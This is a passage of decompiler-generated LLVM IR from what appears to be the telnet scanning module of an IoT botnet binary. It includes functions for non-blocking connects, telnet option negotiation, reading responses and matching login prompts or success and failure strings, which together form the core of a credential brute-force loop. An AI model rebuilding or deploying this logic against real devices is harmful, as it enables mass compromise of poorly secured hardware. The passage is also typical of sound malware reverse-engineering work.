  br label %dec_label_pc_99c0

dec_label_pc_99c0:                                ; preds = %dec_label_pc_993c, %dec_label_pc_99ac
  %storemerge = phi i32 [ -1, %dec_label_pc_993c ], [ %stack_var_-36.0.lcssa, %dec_label_pc_99ac ]
  %v2_99cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_99cc, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_998862, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.061, { 1, 2, 0 }
  uselistorder i32 %v1_98e8, { 1, 0 }
  uselistorder i32 %storemerge615, { 1, 0 }
  uselistorder i32 %storemerge527, { 1, 0 }
  uselistorder i32 %v2_9740, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_99c0, { 1, 0 }
  uselistorder label %dec_label_pc_99ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9910, { 1, 0 }
  uselistorder label %dec_label_pc_9830, { 1, 0 }
  uselistorder label %dec_label_pc_9830.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9754, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_99dc = load i32, i32* @fp, align 4
  store i32 39396, i32* %stack_var_-4, align 4
  %v2_99e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_99e0, i32* @fp, align 4
  %v1_99f0 = add i32 %arg1, 4
  %v2_99f0 = inttoptr i32 %v1_99f0 to i32*
  %v3_99f0 = load i32, i32* %v2_99f0, align 4
  store i32 %v3_99f0, i32* @r0, align 4
  %v1_99fc = call i32 @__GI_inet_ntoa(i32 %v3_99f0)
  store i32 %v3_99dc, i32* @fp, align 4
  ret i32 %v1_99fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9a18 = load i32, i32* @fp, align 4
  store i32 39456, i32* %stack_var_-4, align 4
  %v2_9a1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a1c, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9a44 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9a58 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9a68 = load i8, i8* %arg3, align 1
  %v2_9a6c = icmp eq i8 %v2_9a68, -1
  br i1 %v2_9a6c, label %dec_label_pc_9a74, label %dec_label_pc_9a84

dec_label_pc_9a74:                                ; preds = %entry
  %v3_9a68 = zext i8 %v2_9a68 to i32
  %v6_9a80 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9a68, i32 %v5_9a58)
  br label %dec_label_pc_9a84

dec_label_pc_9a84:                                ; preds = %entry, %dec_label_pc_9a74
  %v3_9a88 = load i32, i32* %stack_var_0, align 4
  %v3_9a8c = call i32 @contains_string(i32 %tmp, i32 %v3_9a88)
  %v2_9a94 = icmp ne i32 %v3_9a8c, 0
  %. = zext i1 %v2_9a94 to i32
  store i32 %v3_9a18, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9a68, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9a84, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9b08.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9ac8 = load i32, i32* @fp, align 4
  store i32 %v3_9ac8, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9af4 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9b08

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9b08.lr.ph, %dec_label_pc_9b08
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9b08.lr.ph ], [ %v1_9b1c, %dec_label_pc_9b08 ]
  %v5_9b14 = mul nuw nsw i32 %storemerge25, 4
  %v6_9b14 = add i32 %v5_9b14, %v2_9af4
  %v7_9b14 = inttoptr i32 %v6_9b14 to i32*
  store i32 0, i32* %v7_9b14, align 4
  %v1_9b1c = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9b1c, 32
  br i1 %tmp21, label %dec_label_pc_9b08, label %dec_label_pc_9b30

dec_label_pc_9b30:                                ; preds = %dec_label_pc_9b08
  %v13_9ac8 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9b34 = udiv i32 %arg1, 32
  %v3_9b40 = mul nuw nsw i32 %v3_9b34, 4
  %v2_9b48 = add nsw i32 %v3_9b40, -136
  %v2_9b4c = add i32 %v2_9b48, %v13_9ac8
  %v1_9b50 = inttoptr i32 %v2_9b4c to i32*
  %v2_9b50 = load i32, i32* %v1_9b50, align 4
  %v1_9b58 = urem i32 %arg1, 32
  %v6_9b60 = shl i32 1, %v1_9b58
  %v2_9b64 = or i32 %v2_9b50, %v6_9b60
  store i32 %v2_9b64, i32* %v1_9b50, align 4
  %v1_9b84 = add i32 %arg1, 1
  %v2_9b8c = ptrtoint i32* %stack_var_-160 to i32
  %v5_9ba0 = call i32 @__libc_select(i32 %v1_9b84, i32 %v2_9af4, i32 0, i32 0, i32 %v2_9b8c)
  %v5_9bac = icmp sgt i32 %v5_9ba0, 0
  br i1 %v5_9bac, label %dec_label_pc_9bbc, label %dec_label_pc_9bb0

dec_label_pc_9bb0:                                ; preds = %dec_label_pc_9b30
  br label %dec_label_pc_9bdc

dec_label_pc_9bbc:                                ; preds = %dec_label_pc_9b30
  %v5_9bd0 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9bdc

dec_label_pc_9bdc:                                ; preds = %dec_label_pc_9bb0, %dec_label_pc_9bbc
  %storemerge = phi i32 [ %v5_9bd0, %dec_label_pc_9bbc ], [ 0, %dec_label_pc_9bb0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9af4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9bdc, { 1, 0 }
  uselistorder label %dec_label_pc_9b08, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9c0c = icmp eq i32 %arg2, 0
  br i1 %v2_9c0c, label %dec_label_pc_9c14, label %dec_label_pc_9c24

dec_label_pc_9c14:                                ; preds = %entry
  %v2_9c18 = load i32, i32* %arg1, align 4
  %v1_9c20 = call i32 @__GI_close(i32 %v2_9c18)
  br label %dec_label_pc_9c24

dec_label_pc_9c24:                                ; preds = %entry, %dec_label_pc_9c14
  %v2_9c2c = add i32 %tmp, 16
  %v3_9c2c = inttoptr i32 %v2_9c2c to i32*
  store i32 0, i32* %v3_9c2c, align 4
  %v3_9c30 = load i32, i32* %stack_var_-24, align 4
  %v1_9c3c = trunc i32 %v3_9c30 to i8
  %v3_9c3c = add i32 %tmp, 8
  %v4_9c3c = inttoptr i32 %v3_9c3c to i8*
  store i8 %v1_9c3c, i8* %v4_9c3c, align 1
  %v1_9c44 = add i32 %tmp, 24
  %v2_9c44 = inttoptr i32 %v1_9c44 to i32*
  %v3_9c44 = load i32, i32* %v2_9c44, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9c54 = inttoptr i32 %v3_9c44 to i8*
  %v3_9c54 = call i32 @__GI_memset(i8* %v2_9c54, i32 0)
  ret i32 %v3_9c54

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9c24, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9c68 = load i32, i32* @fp, align 4
  %v2_9c80 = inttoptr i32 %arg1 to i32*
  %v3_9c80 = call i32 @advance_state(i32* %v2_9c80, i32 0)
  %v3_9c8c = add i32 %arg1, 9
  %v4_9c8c = inttoptr i32 %v3_9c8c to i8*
  store i8 1, i8* %v4_9c8c, align 1
  store i32 %v3_9c68, i32* @fp, align 4
  ret i32 %v3_9c80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9ca0 = load i32, i32* @fp, align 4
  %v3_9cb8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_261d4.50 to i32))
  store i32 %v3_9ca0, i32* @fp, align 4
  ret i32 %v3_9cb8
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9cd8 = load i32, i32* @fp, align 4
  %v3_9cf0 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_261b4.59 to i32))
  store i32 %v3_9cd8, i32* @fp, align 4
  ret i32 %v3_9cf0

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40216, i32* %stack_var_-4, align 4
  %v2_9d14 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9d14, i32* @fp, align 4
  %v1_9d24 = call i32 @contains_success(i32 %arg1)
  %v2_9d2c = icmp eq i32 %v1_9d24, 0
  br i1 %v2_9d2c, label %dec_label_pc_9d34, label %dec_label_pc_9d5c

dec_label_pc_9d34:                                ; preds = %entry
  %v1_9d38 = call i32 @contains_fail(i32 %arg1)
  %v2_9d40 = icmp ne i32 %v1_9d38, 0
  %. = zext i1 %v2_9d40 to i32
  br label %dec_label_pc_9d5c

dec_label_pc_9d5c:                                ; preds = %dec_label_pc_9d34, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9d34 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_9da0

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9da0, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_9da4, %dec_label_pc_9da0 ]
  %v1_9da4 = add i32 %stack_var_-24.0, 1
  %v3_9db0 = mul i32 %v1_9da4, 4
  %v2_9dbc = add i32 %v3_9db0, %arg2
  %v1_9dc0 = inttoptr i32 %v2_9dbc to i32*
  %v2_9dc0 = load i32, i32* %v1_9dc0, align 4
  %v2_9dc4 = icmp eq i32 %v2_9dc0, 0
  br i1 %v2_9dc4, label %dec_label_pc_9e20.preheader, label %dec_label_pc_9da0

dec_label_pc_9e20.preheader:                      ; preds = %dec_label_pc_9da0
  %v3_9df8 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_9e20

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9e20
  %v3_9ddc = mul i32 %storemerge2, 4
  %v2_9de8 = add i32 %v3_9ddc, %arg2
  %v1_9dec = inttoptr i32 %v2_9de8 to i32*
  %v2_9dec = load i32, i32* %v1_9dec, align 4
  %v4_9df8 = call i32 @strcasestr(i8* %v3_9df8, i32 %v2_9dec, i32 %v3_9ddc)
  %v2_9e00 = icmp eq i32 %v4_9df8, 0
  %v1_9e18 = add nuw i32 %storemerge2, 1
  br i1 %v2_9e00, label %dec_label_pc_9e20, label %dec_label_pc_9e38

dec_label_pc_9e20:                                ; preds = %dec_label_pc_9dd8, %dec_label_pc_9e20.preheader
  %storemerge2 = phi i32 [ %v1_9e18, %dec_label_pc_9dd8 ], [ 0, %dec_label_pc_9e20.preheader ]
  %v5_9e2c = icmp slt i32 %storemerge2, %v1_9da4
  br i1 %v5_9e2c, label %dec_label_pc_9dd8, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e20, %dec_label_pc_9dd8
  %storemerge = phi i32 [ 1, %dec_label_pc_9dd8 ], [ 0, %dec_label_pc_9e20 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_9da4, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r3, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9e50 = load i32, i32* @fp, align 4
  store i32 %v3_9e50, i32* %stack_var_-16, align 4
  %v13_9e50 = ptrtoint i32* %stack_var_-16 to i32
  %v2_9e78 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_9e88 = or i32 %v2_9e78, 2048
  store i32 %v1_9e88, i32* @r3, align 4
  %v2_9e9c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_9eb0 = urem i32 %arg3, 65536
  %v1_9eb8 = call i32 @__GI_htons(i32 %v3_9eb0)
  %v3_9ed8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_9ee0 = icmp eq i32 %v3_9ed8, 0
  br i1 %v2_9ee0, label %dec_label_pc_9ef4, label %dec_label_pc_9ee8

dec_label_pc_9ee8:                                ; preds = %entry
  br label %dec_label_pc_a0ac

dec_label_pc_9ef4:                                ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_9f08 = bitcast i32* %stack_var_-40 to i8*
  %v3_9f08 = call i32 @__GI_memset(i8* %v2_9f08, i32 0)
  %v2_9f0c = ptrtoint i32* %stack_var_-48 to i32
  %v3_9f1c = call i32 @__libc_connect(i32 %arg1, i32 %v2_9f0c, i32 16)
  store i32 %v3_9f1c, i32* @r3, align 4
  %v1_9f2c = icmp slt i32 %v3_9f1c, 0
  br i1 %v1_9f2c, label %dec_label_pc_9f34, label %dec_label_pc_a070

dec_label_pc_9f34:                                ; preds = %dec_label_pc_9ef4
  %v0_9f34 = call i32 @__GI___errno_location()
  %v1_9f3c = inttoptr i32 %v0_9f34 to i32*
  %v2_9f3c = load i32, i32* %v1_9f3c, align 4
  %v7_9f40 = icmp eq i32 %v2_9f3c, 115
  br i1 %v7_9f40, label %dec_label_pc_9f6c.lr.ph, label %dec_label_pc_a064

dec_label_pc_9f6c.lr.ph:                          ; preds = %dec_label_pc_9f34
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_9f58 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9f6c

dec_label_pc_9f6c:                                ; preds = %dec_label_pc_9f6c.lr.ph, %dec_label_pc_9f6c
  %storemerge14 = phi i32 [ 0, %dec_label_pc_9f6c.lr.ph ], [ %v1_9f80, %dec_label_pc_9f6c ]
  %v5_9f78 = mul nuw nsw i32 %storemerge14, 4
  %v6_9f78 = add i32 %v5_9f78, %v2_9f58
  %v7_9f78 = inttoptr i32 %v6_9f78 to i32*
  store i32 0, i32* %v7_9f78, align 4
  %v1_9f80 = add nuw nsw i32 %storemerge14, 1
  %tmp28 = icmp ult i32 %v1_9f80, 32
  br i1 %tmp28, label %dec_label_pc_9f6c, label %dec_label_pc_9f94

dec_label_pc_9f94:                                ; preds = %dec_label_pc_9f6c
  %v3_9f98 = udiv i32 %arg1, 32
  %v3_9fa4 = mul nuw nsw i32 %v3_9f98, 4
  %v2_9fac = add nsw i32 %v3_9fa4, -160
  %v2_9fb0 = add i32 %v2_9fac, %v13_9e50
  %v1_9fb4 = inttoptr i32 %v2_9fb0 to i32*
  %v2_9fb4 = load i32, i32* %v1_9fb4, align 4
  %v1_9fbc = urem i32 %arg1, 32
  %v6_9fc4 = shl i32 1, %v1_9fbc
  %v2_9fc8 = or i32 %v2_9fb4, %v6_9fc4
  store i32 %v2_9fc8, i32* %v1_9fb4, align 4
  %v1_9fe8 = add i32 %arg1, 1
  %v2_9ff0 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a008 = call i32 @__libc_select(i32 %v1_9fe8, i32 0, i32 %v2_9f58, i32 0, i32 %v2_9ff0)
  %tmp29 = icmp slt i32 %v5_a008, 1
  br i1 %tmp29, label %dec_label_pc_a058, label %dec_label_pc_a018

dec_label_pc_a018:                                ; preds = %dec_label_pc_9f94
  store i32 4, i32* %stack_var_-188, align 4
  %v2_a020 = ptrtoint i32* %stack_var_-192 to i32
  %v2_a024 = ptrtoint i32* %stack_var_-188 to i32
  %v5_a03c = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_a020, i32 %v2_a024)
  %v3_a040 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_a040, i32* @r3, align 4
  %v2_a044 = icmp eq i32 %v3_a040, 0
  br i1 %v2_a044, label %dec_label_pc_a070, label %dec_label_pc_a04c

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a018
  br label %dec_label_pc_a0ac

dec_label_pc_a058:                                ; preds = %dec_label_pc_9f94
  br label %dec_label_pc_a0ac

dec_label_pc_a064:                                ; preds = %dec_label_pc_9f34
  br label %dec_label_pc_a0ac

dec_label_pc_a070:                                ; preds = %dec_label_pc_9ef4, %dec_label_pc_a018
  %v2_a07c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a08c = and i32 %v2_a07c, -2049
  store i32 %v1_a08c, i32* @r3, align 4
  %v2_a0a0 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a064, %dec_label_pc_a058, %dec_label_pc_a04c, %dec_label_pc_9ee8, %dec_label_pc_a070
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a058 ], [ 1, %dec_label_pc_a070 ], [ 0, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a064 ], [ 0, %dec_label_pc_9ee8 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_9f58, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_a0ac, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a070, { 1, 0 }
  uselistorder label %dec_label_pc_9f6c, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_a0c4 = load i32, i32* @r4, align 4
  %v6_a0c4 = load i32, i32* @r5, align 4
  %v9_a0c4 = load i32, i32* @r6, align 4
  %v12_a0c4 = load i32, i32* @fp, align 4
  store i32 41164, i32* %stack_var_-4, align 4
  %v2_a0c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a0c8, i32* @fp, align 4
  %v0_a0d0 = call i32 @__libc_fork()
  %v2_a0e0 = icmp eq i32 %v0_a0d0, 0
  br i1 %v2_a0e0, label %dec_label_pc_a24c, label %dec_label_pc_a0f4

dec_label_pc_a0f4:                                ; preds = %entry
  %v2_a0f8 = load i32, i32* @global_var_264a0.61, align 4
  %v5_a0f8 = load i32, i32* @global_var_264a4.62, align 4
  %v2_a104 = add i32 %v2_a0f8, 1
  %v3_a104 = icmp eq i32 %v2_a104, 0
  %v4_a108 = zext i1 %v3_a104 to i32
  %v5_a108 = add i32 %v4_a108, %v5_a0f8
  store i32 %v2_a104, i32* @global_var_264a0.61, align 4
  store i32 %v5_a108, i32* @global_var_264a4.62, align 4
  %v2_a124 = add i32 %v2_a0f8, 2
  %v3_a124 = icmp eq i32 %v2_a104, -1
  %v4_a128 = zext i1 %v3_a124 to i32
  %v5_a128 = add i32 %v5_a108, %v4_a128
  %v3_a12c = udiv i32 %v2_a124, 1073741824
  %v3_a130 = mul i32 %v5_a128, 4
  %v2_a134 = or i32 %v3_a130, %v3_a12c
  store i32 %v2_a134, i32* @r4, align 4
  %v3_a138 = mul i32 %v2_a124, 4
  %v1_a140 = call i32 @malloc(i32 %v3_a138)
  br label %dec_label_pc_a198

dec_label_pc_a158:                                ; preds = %dec_label_pc_a198, %dec_label_pc_a1e4
  %v3_a15c = mul i32 %storemerge2, 4
  %v2_a168 = add i32 %v3_a15c, %v1_a140
  %v2_a17c = load i32, i32* @global_var_2c708.64, align 4
  %v2_a180 = add i32 %v2_a17c, %v3_a15c
  %v1_a184 = inttoptr i32 %v2_a180 to i32*
  %v2_a184 = load i32, i32* %v1_a184, align 4
  %v2_a188 = inttoptr i32 %v2_a168 to i32*
  store i32 %v2_a184, i32* %v2_a188, align 4
  %v1_a190 = add i32 %storemerge2, 1
  br label %dec_label_pc_a198

dec_label_pc_a198:                                ; preds = %dec_label_pc_a0f4, %dec_label_pc_a158
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a0f4 ], [ %v1_a190, %dec_label_pc_a158 ]
  %v2_a1b0 = load i32, i32* @global_var_264a0.61, align 4
  %v5_a1b0 = load i32, i32* @global_var_264a4.62, align 4
  %v2_a1c4 = add i32 %v2_a1b0, -1
  %v3_a1c4 = icmp ne i32 %v2_a1b0, 0
  %v3_a1c8 = add i32 %v5_a1b0, -1
  %v5_a1c8 = sext i1 %v3_a1c4 to i32
  %v9_a1dc = icmp eq i32 %v3_a1c8, %v5_a1c8
  br i1 %v9_a1dc, label %dec_label_pc_a1e4, label %dec_label_pc_a158

dec_label_pc_a1e4:                                ; preds = %dec_label_pc_a198
  store i32 %v2_a1c4, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a1c4, %storemerge2
  br i1 %tmp, label %dec_label_pc_a158, label %dec_label_pc_a204

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1e4
  store i32 %v5_a1b0, i32* @r4, align 4
  %v3_a20c = mul i32 %v2_a1b0, 4
  %v1_a210 = add i32 %v1_a140, -4
  %v2_a21c = add i32 %v1_a210, %v3_a20c
  %v2_a224 = inttoptr i32 %v2_a21c to i32*
  store i32 %v0_a0d0, i32* %v2_a224, align 4
  %v2_a22c = load i32, i32* @global_var_2c708.64, align 4
  store i32 %v2_a22c, i32* @r0, align 4
  %v0_a234 = call i32 @free()
  store i32 %v1_a140, i32* @global_var_2c708.64, align 4
  br label %dec_label_pc_a24c

dec_label_pc_a24c:                                ; preds = %entry, %dec_label_pc_a204
  store i32 %v3_a0c4, i32* @r4, align 4
  store i32 %v6_a0c4, i32* @r5, align 4
  store i32 %v9_a0c4, i32* @r6, align 4
  store i32 %v12_a0c4, i32* @fp, align 4
  ret i32 %v0_a0d0

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a15c, { 1, 0 }
  uselistorder i32 %v1_a140, { 2, 0, 1 }
  uselistorder i32 %v2_a104, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a24c, { 1, 0 }
  uselistorder label %dec_label_pc_a198, { 1, 0 }
  uselistorder label %dec_label_pc_a158, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a288 = add i32 %arg2, 1
  %v1_a28c = inttoptr i32 %v1_a288 to i8*
  %v2_a28c = load i8, i8* %v1_a28c, align 1
  %v7_a298 = icmp ult i8 %v2_a28c, -5
  br i1 %v7_a298, label %dec_label_pc_a3e4, label %dec_label_pc_a2a0

dec_label_pc_a2a0:                                ; preds = %entry
  %v7_a2a8 = icmp eq i8 %v2_a28c, -1
  br i1 %v7_a2a8, label %dec_label_pc_a2ac, label %dec_label_pc_a2c8

dec_label_pc_a2ac:                                ; preds = %dec_label_pc_a2a0
  br label %dec_label_pc_a3e4

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a0
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a2d0 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a2e4 = call i32 @__libc_send(i32 %arg1, i32 %v2_a2d0, i32 1, i32 16384)
  %v2_a2f0 = load i8, i8* %v1_a28c, align 1
  %v7_a2f4 = icmp eq i8 %v2_a2f0, -4
  br i1 %v7_a2f4, label %dec_label_pc_a2fc, label %dec_label_pc_a308

dec_label_pc_a2fc:                                ; preds = %dec_label_pc_a2c8
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3a8

dec_label_pc_a308:                                ; preds = %dec_label_pc_a2c8
  %v2_a310 = load i8, i8* %v1_a28c, align 1
  %v7_a314 = icmp eq i8 %v2_a310, -2
  br i1 %v7_a314, label %dec_label_pc_a31c, label %dec_label_pc_a328

dec_label_pc_a31c:                                ; preds = %dec_label_pc_a308
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3a8

dec_label_pc_a328:                                ; preds = %dec_label_pc_a308
  %v2_a330 = load i8, i8* %v1_a28c, align 1
  %v7_a334 = icmp eq i8 %v2_a330, 3
  %v7_a348 = icmp eq i8 %v2_a330, -3
  br i1 %v7_a334, label %dec_label_pc_a33c, label %dec_label_pc_a374

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a328
  br i1 %v7_a348, label %dec_label_pc_a350, label %dec_label_pc_a35c

dec_label_pc_a350:                                ; preds = %dec_label_pc_a33c
  br label %dec_label_pc_a364

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a33c
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %dec_label_pc_a350, %dec_label_pc_a35c
  %storemerge = phi i8 [ -3, %dec_label_pc_a35c ], [ -5, %dec_label_pc_a350 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3a8

dec_label_pc_a374:                                ; preds = %dec_label_pc_a328
  br i1 %v7_a348, label %dec_label_pc_a388, label %dec_label_pc_a394

dec_label_pc_a388:                                ; preds = %dec_label_pc_a374
  br label %dec_label_pc_a39c

dec_label_pc_a394:                                ; preds = %dec_label_pc_a374
  br label %dec_label_pc_a39c

dec_label_pc_a39c:                                ; preds = %dec_label_pc_a388, %dec_label_pc_a394
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a394 ], [ -4, %dec_label_pc_a388 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3a8

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a31c, %dec_label_pc_a2fc, %dec_label_pc_a39c
  %v4_a3bc = call i32 @__libc_send(i32 %arg1, i32 %v2_a2d0, i32 1, i32 16384)
  %v1_a3c4 = add i32 %arg2, 2
  %v4_a3d8 = call i32 @__libc_send(i32 %arg1, i32 %v1_a3c4, i32 1, i32 16384)
  br label %dec_label_pc_a3e4

dec_label_pc_a3e4:                                ; preds = %dec_label_pc_a2ac, %dec_label_pc_a3a8, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a3e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a3a8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a39c, { 1, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a418 = call i32 @strlen(i8* %arg1)
  %v2_a460 = add i32 %v3_a418, %tmp
  br label %dec_label_pc_a534

dec_label_pc_a438:                                ; preds = %dec_label_pc_a4c0, %dec_label_pc_a49c, %dec_label_pc_a478, %dec_label_pc_a454
  %v1_a43c = add nsw i32 %stack_var_-28.014, 1
  %v7_a450 = icmp sgt i32 %v3_a418, %v1_a43c
  br i1 %v7_a450, label %dec_label_pc_a454, label %dec_label_pc_a4e4

dec_label_pc_a454:                                ; preds = %dec_label_pc_a444.preheader, %dec_label_pc_a438
  %stack_var_-28.014 = phi i32 [ %v1_a43c, %dec_label_pc_a438 ], [ %stack_var_-28.1, %dec_label_pc_a444.preheader ]
  %v2_a468 = sub i32 %v2_a460, %stack_var_-28.014
  %v1_a46c = inttoptr i32 %v2_a468 to i8*
  %v2_a46c = load i8, i8* %v1_a46c, align 1
  %v2_a470 = icmp eq i8 %v2_a46c, 0
  br i1 %v2_a470, label %dec_label_pc_a438, label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a454
